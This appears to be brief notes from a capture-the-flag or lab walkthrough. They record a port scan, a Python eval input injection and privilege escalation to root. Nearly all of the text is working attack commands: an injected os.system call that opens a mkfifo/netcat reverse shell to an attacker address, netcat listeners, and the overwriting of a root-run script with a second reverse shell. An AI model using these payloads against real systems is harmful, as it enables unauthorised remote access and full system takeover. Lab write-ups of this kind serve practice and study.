22 openssh 7.2p2 ubuntu-4ubuntu2.8  
10000 snet-sensor-mgmt
   

nc <ip> 10000
 
python input injection
 
eval('__import__("os").system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f")')
 
nc -nlvp 4242
 
rm root.sh
 
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8888 >/tmp/f" > root.sh
 
nc -nlvp 8888
 
root